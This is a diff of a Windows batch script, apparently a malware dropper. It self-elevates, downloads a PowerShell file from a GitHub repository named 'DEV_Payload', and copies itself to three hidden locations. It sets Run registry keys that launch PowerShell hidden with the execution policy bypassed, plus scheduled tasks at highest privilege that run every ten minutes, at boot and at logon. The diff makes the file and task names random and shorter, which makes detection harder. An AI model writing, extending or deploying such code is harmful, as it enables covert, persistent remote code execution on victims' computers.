@@ -1,6 +1,6 @@
 @echo off
 :: ===============================================
-:: UNIVERSAL WATCHER INSTALLER + MULTI-PERSISTENCE + ELEVATION
+:: UNIVERSAL WATCHER INSTALLER - MAXIMUM PERSISTENCE
 :: ===============================================
 
 :: --- ELEVATE SCRIPT ---
@@ -11,18 +11,20 @@ if '%errorlevel%' NEQ '0' (
     exit /b
 )
 
-:: Generate fake GUID-like suffixes
-set "G1=71BD4F4C-9E84-47D1-AB91-4FABA1FCDD6B"
-set "G2=F2B7E619-BE74-4846-8BD0-53484C3FCF79"
-set "G3=59FBA7F0-70E4-45A3-BE34-DF98D783592F"
+:: Generate random GUID-like suffixes
+setlocal enabledelayedexpansion
+set "RAND1=!random!!random!"
+set "RAND2=!random!!random!"
+set "RAND3=!random!!random!"
+endlocal & set "G1=%RAND1%" & set "G2=%RAND2%" & set "G3=%RAND3%"
 
 :: PowerShell script URL
 set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1?nocache=%random%"
 
 :: Batch file install paths
-set "BAT1=%APPDATA%\UniversalWatcherInstaller_%G1%.bat"
-set "BAT2=%ProgramData%\UniversalWatcherInstaller_%G2%.bat"
-set "BAT3=%TEMP%\UniversalWatcherInstaller_%G3%.bat"
+set "BAT1=%APPDATA%\UniversalWatcher_%G1%.bat"
+set "BAT2=%ProgramData%\UniversalWatcher_%G2%.bat"
+set "BAT3=%TEMP%\UniversalWatcher_%G3%.bat"
 
 :: PowerShell script install paths
 set "LOC1=%APPDATA%\UniversalWatcher_%G1%.ps1"
@@ -33,17 +35,19 @@ set "LOC3=%TEMP%\UniversalWatcher_%G3%.ps1"
 set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 
 :: Autorun registry keys
-set "BATKEY1=UniversalWatcher_BAT_%G1%"
-set "BATKEY2=UniversalWatcher_BAT_%G2%"
-set "BATKEY3=UniversalWatcher_BAT_%G3%"
-set "PSKEY1=UniversalWatcher_PS_%G1%"
-set "PSKEY2=UniversalWatcher_PS_%G2%"
-set "PSKEY3=UniversalWatcher_PS_%G3%"
+set "BATKEY1=Watcher_BAT_%G1%"
+set "BATKEY2=Watcher_BAT_%G2%"
+set "BATKEY3=Watcher_BAT_%G3%"
+set "PSKEY1=Watcher_PS_%G1%"
+set "PSKEY2=Watcher_PS_%G2%"
+set "PSKEY3=Watcher_PS_%G3%"
 
 :: Scheduled Task names
-set "TASKNAME1=UniversalWatcherTask_%G1%"
-set "TASKNAME2=UniversalWatcherTask_%G2%"
-set "TASKNAME3=UniversalWatcherTask_%G3%"
+set "TASKNAME1=WatcherTask_%G1%"
+set "TASKNAME2=WatcherTask_%G2%"
+set "TASKNAME3=WatcherTask_%G3%"
+set "TASKNAME4=WatcherBoot_%G1%"
+set "TASKNAME5=WatcherLogon_%G2%"
 
 :: ========================
 :: Copy this batch file to multiple locations
@@ -79,12 +83,17 @@ reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -Windo
 reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f
 
 :: ========================
-:: Create multiple scheduled tasks for extra persistence
+:: Create multiple scheduled tasks for persistence
 :: ========================
 echo [INFO] Creating scheduled tasks...
+:: Every 10 min
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME1%" /tr "\"%BAT1%\"" /rl HIGHEST
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME2%" /tr "\"%BAT2%\"" /rl HIGHEST
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME3%" /tr "\"%BAT3%\"" /rl HIGHEST
+:: On boot
+schtasks /create /f /sc onstart /tn "%TASKNAME4%" /tr "\"%BAT1%\"" /rl HIGHEST
+:: On logon
+schtasks /create /f /sc onlogon /tn "%TASKNAME5%" /tr "\"%BAT2%\"" /rl HIGHEST
 
 :: ========================
 :: Start the persistence loop
